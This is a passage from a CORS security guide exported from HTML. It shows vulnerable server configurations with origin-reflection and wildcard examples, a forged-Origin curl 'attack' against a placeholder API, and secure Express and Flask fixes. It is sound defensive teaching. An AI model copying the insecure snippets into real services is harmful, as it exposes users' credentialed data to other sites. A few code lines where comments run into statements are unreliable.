+</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80ee-abe5-f3b22e1195a8" class=""><strong>Why:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80b9-97bb-c6397b022c69" class="bulleted-list"><li style="list-style-type:disc">Wildcard with credentials is a security risk</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-803c-828f-fbdc2a9c53dc" class="bulleted-list"><li style="list-style-type:disc">Browsers enforce this rule</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8065-b5f5-ce46245b08ad" class="bulleted-list"><li style="list-style-type:disc">Must specify exact origin when using credentials</li></ul></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-80e7-a92e-f7960ed6d1b0" class=""><strong>Credentials Example</strong></h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-803c-b173-c2bb6ae5a9bb" class=""><strong>Complete Flow:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8073-a519-e5740c8f5e0b" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Client: example.comfetch(&#x27;https://api.example.com/data&#x27;, {
+  credentials: &#x27;include&#x27;,
+  headers: {
+    &#x27;Content-Type&#x27;: &#x27;application/json&#x27;
+  }
+});
+</code></pre></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80f8-9be0-e551c967277f" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all"># Request
+GET /api/data HTTP/1.1
+Host: api.example.com
+Origin: https://example.com
+Cookie: sessionId=abc123
+
+# Response
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://example.com
+Access-Control-Allow-Credentials: true
+Set-Cookie: sessionId=xyz789; HttpOnly; Secure; SameSite=None
+
+{&quot;data&quot;: &quot;value&quot;}
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-8035-b570-cd61b557433d"/></div><div style="display:contents" dir="auto"><h2 id="2b4562ad-76f0-808e-9b1d-fe6eb09bd47e" class=""><strong>Common CORS Vulnerabilities</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-8079-a23f-c8ca7618b11a" class=""><strong>1. Wildcard with Credentials</strong></h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8055-8019-f9cc73b2ca7c" class=""><strong>Vulnerability:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-804a-b41a-f9215bec4266" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8089-a644-e8b8c51ba139" class=""><strong>Impact:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8059-9dcf-ecdc433ea265" class="bulleted-list"><li style="list-style-type:disc">Browsers should reject this (spec violation)</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-809e-b0b2-faa7c1268c67" class="bulleted-list"><li style="list-style-type:disc">But if misconfigured, any origin can access with credentials</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-804a-826f-d4b1f3f98f1e" class="bulleted-list"><li style="list-style-type:disc">Sensitive data exposure</li></ul></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80fa-bef4-eb880190bade" class=""><strong>Fix:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8016-ad87-cce4105e5f75" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Access-Control-Allow-Origin: https://example.com
+Access-Control-Allow-Credentials: true
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-8094-adab-e72eb8a56982" class=""><strong>2. Origin Reflection Without Validation</strong></h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8094-bdd7-fc47dfc056be" class=""><strong>Vulnerability:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8007-976e-f40bc3508791" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Server blindly reflects Origin header
+app.use((req, res) =&gt; {
+  res.setHeader(&#x27;Access-Control-Allow-Origin&#x27;, req.headers.origin);
+  res.setHeader(&#x27;Access-Control-Allow-Credentials&#x27;, &#x27;true&#x27;);
+});
+</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80eb-8a5f-fdf07b238f0b" class=""><strong>Attack:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-804a-9794-d9ba7de8fa4d" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all"># Attacker sends request with malicious origin
+curl -H &quot;Origin: https://evil.com&quot; https://api.example.com/data
+
+# Server reflects it
+Access-Control-Allow-Origin: https://evil.com
+Access-Control-Allow-Credentials: true
+</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8081-a06b-c5313cddb8af" class=""><strong>Fix:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8007-80f4-f075d6dd6e1c" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">const allowedOrigins = [&#x27;https://example.com&#x27;, &#x27;https://app.example.com&#x27;];
+
+app.use((req, res) =&gt; {
+  const origin = req.headers.origin;
+  if (allowedOrigins.includes(origin)) {
+    res.setHeader(&#x27;Access-Control-Allow-Origin&#x27;, origin);
+    res.setHeader(&#x27;Access-Control-Allow-Credentials&#x27;, &#x27;true&#x27;);
+  }
+});
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-808b-9ae2-f67dd22be549" class=""><strong>3. Overly Permissive Methods</strong></h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-800e-ac01-d507d26ea690" class=""><strong>Vulnerability:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80ac-8a95-eda55b39dbfa" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Access-Control-Allow-Methods: *
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD, TRACE, CONNECT
+</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8044-b427-d74af6dfed3a" class=""><strong>Impact:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8020-9d09-f25427a79d8c" class="bulleted-list"><li style="list-style-type:disc">Allows unnecessary HTTP methods</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80d7-ae3f-d67e94bb0ce1" class="bulleted-list"><li style="list-style-type:disc">Increases attack surface</li></ul></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80ea-b8a4-e8acf6a0d648" class=""><strong>Fix:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8018-a0fb-d67ba74a8553" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Access-Control-Allow-Methods: GET, POST
+# Only allow methods you actually use
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-8048-a9ee-e544a94a5de5" class=""><strong>4. Overly Permissive Headers</strong></h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80e6-a1a4-e287694a0ecb" class=""><strong>Vulnerability:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8060-aca9-cd082854acc7" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Access-Control-Allow-Headers: *
+Access-Control-Allow-Headers: *
+</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80b1-a4cd-e35124bc0bd0" class=""><strong>Impact:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-807d-8489-e0402e031d52" class="bulleted-list"><li style="list-style-type:disc">Allows any custom headers</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8082-9ff0-d940b3ebf3fd" class="bulleted-list"><li style="list-style-type:disc">May bypass security controls</li></ul></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8030-b178-d0b1261c1df4" class=""><strong>Fix:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-803b-a9a7-e790e84cbd34" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Access-Control-Allow-Headers: Content-Type, Authorization
+# Only allow headers you actually need
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-806e-8e7e-c7b120673485" class=""><strong>5. Missing Preflight Validation</strong></h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8077-9d2e-d335518f8233" class=""><strong>Vulnerability:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80d8-8973-d318688b133e" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Server doesn&#x27;t validate preflight properly
+app.options(&#x27;*&#x27;, (req, res) =&gt; {
+  res.setHeader(&#x27;Access-Control-Allow-Origin&#x27;, &#x27;*&#x27;);
+  res.setHeader(&#x27;Access-Control-Allow-Methods&#x27;, &#x27;*&#x27;);
+  res.end();
+});
+</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8045-83ac-f0d3db24197f" class=""><strong>Impact:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80d9-9c32-e012f1cae116" class="bulleted-list"><li style="list-style-type:disc">Allows any origin to make any request</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80b9-9cea-d794f8511673" class="bulleted-list"><li style="list-style-type:disc">Bypasses security controls</li></ul></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80d5-837e-ce307c5c4f29" class=""><strong>Fix:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80c9-9ba0-c814853e7fae" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">const allowedOrigins = [&#x27;https://example.com&#x27;];
+
+app.options(&#x27;*&#x27;, (req, res) =&gt; {
+  const origin = req.headers.origin;
+  if (allowedOrigins.includes(origin)) {
+    res.setHeader(&#x27;Access-Control-Allow-Origin&#x27;, origin);
+    res.setHeader(&#x27;Access-Control-Allow-Methods&#x27;, &#x27;GET, POST&#x27;);
+    res.setHeader(&#x27;Access-Control-Allow-Headers&#x27;, &#x27;Content-Type&#x27;);
+  }
+  res.end();
+});
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-802b-85c7-eedb59288e92" class=""><strong>6. Subdomain Wildcard Abuse</strong></h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80b9-9ab4-cef5ffb77cc3" class=""><strong>Vulnerability:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80d0-80b8-c864f956ddd2" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Allows any subdomainconst origin = req.headers.origin;
+if (origin &amp;&amp; origin.endsWith(&#x27;.example.com&#x27;)) {
+  res.setHeader(&#x27;Access-Control-Allow-Origin&#x27;, origin);
+}
+</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-802f-9729-f30439fe3f75" class=""><strong>Attack:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8047-ba9a-c57c32ae0192" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all"># Attacker registers evil.example.com# Gets access to API</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80b6-a7fe-d738403b7c46" class=""><strong>Fix:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-809e-8109-e57a68a49262" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">const allowedOrigins = [
+  &#x27;https://example.com&#x27;,
+  &#x27;https://app.example.com&#x27;,
+  &#x27;https://api.example.com&#x27;
+];
+
+const origin = req.headers.origin;
+if (allowedOrigins.includes(origin)) {
+  res.setHeader(&#x27;Access-Control-Allow-Origin&#x27;, origin);
+}
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-803b-95ea-c2135daf9fff"/></div><div style="display:contents" dir="auto"><h2 id="2b4562ad-76f0-80f5-84b7-e8afd369edc4" class=""><strong>Secure CORS Implementation</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-80c2-97b3-f9fc02f7b6de" class=""><strong>Node.js/Express</strong></h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-804c-8ed8-e79770b348a5" class=""><strong>Basic Implementation:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8072-bbb6-ce3de1267a8e" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">const express = require(&#x27;express&#x27;);
+const app = express();
+
+const allowedOrigins = [
+  &#x27;https://example.com&#x27;,
+  &#x27;https://app.example.com&#x27;
+];
+
+// CORS middleware
+app.use((req, res, next) =&gt; {
+  const origin = req.headers.origin;
+
+  if (allowedOrigins.includes(origin)) {
+    res.setHeader(&#x27;Access-Control-Allow-Origin&#x27;, origin);
+    res.setHeader(&#x27;Access-Control-Allow-Credentials&#x27;, &#x27;true&#x27;);
+  }
+
+// Handle preflightif (req.method === &#x27;OPTIONS&#x27;) {
+    res.setHeader(&#x27;Access-Control-Allow-Methods&#x27;, &#x27;GET, POST, PUT, DELETE&#x27;);
+    res.setHeader(&#x27;Access-Control-Allow-Headers&#x27;, &#x27;Content-Type, Authorization&#x27;);
+    res.setHeader(&#x27;Access-Control-Max-Age&#x27;, &#x27;86400&#x27;);
+    return res.sendStatus(200);
+  }
+
+  next();
+});
+
+app.get(&#x27;/api/data&#x27;, (req, res) =&gt; {
+  res.json({ data: &#x27;value&#x27; });
+});
+</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80f3-ab0f-e89eeacd167c" class=""><strong>Using cors middleware:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80f4-89e2-e35a0972a873" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">const express = require(&#x27;express&#x27;);
+const cors = require(&#x27;cors&#x27;);
+const app = express();
+
+const corsOptions = {
+  origin: (origin, callback) =&gt; {
+    const allowedOrigins = [
+      &#x27;https://example.com&#x27;,
+      &#x27;https://app.example.com&#x27;
+    ];
+
+    if (!origin || allowedOrigins.includes(origin)) {
+      callback(null, true);
+    } else {
+      callback(new Error(&#x27;Not allowed by CORS&#x27;));
+    }
+  },
+  credentials: true,
+  methods: [&#x27;GET&#x27;, &#x27;POST&#x27;, &#x27;PUT&#x27;, &#x27;DELETE&#x27;],
+  allowedHeaders: [&#x27;Content-Type&#x27;, &#x27;Authorization&#x27;],
+  maxAge: 86400
+};
+
+app.use(cors(corsOptions));
+
+app.get(&#x27;/api/data&#x27;, (req, res) =&gt; {
+  res.json({ data: &#x27;value&#x27; });
+});
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-8019-9f53-e47dbdbee783" class=""><strong>Python/Flask</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-808d-94eb-d712dfe78c10" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">from flask import Flask, request, jsonify
+from flask_cors import CORS
+
+app = Flask(__name__)
+
+# Configure CORS
+cors = CORS(app, resources={
+    r&quot;/api/*&quot;: {
+        &quot;origins&quot;: [&quot;https://example.com&quot;, &quot;https://app.example.com&quot;],
+        &quot;methods&quot;: [&quot;GET&quot;, &quot;POST&quot;, &quot;PUT&quot;, &quot;DELETE&quot;],
+        &quot;allow_headers&quot;: [&quot;Content-Type&quot;, &quot;Authorization&quot;],
+        &quot;supports_credentials&quot;: True,
+        &quot;max_age&quot;: 86400
+    }
+})
+
+@app.route(&#x27;/api/data&#x27;)
+def get_data():
+    return jsonify({&#x27;data&#x27;: &#x27;value&#x27;})
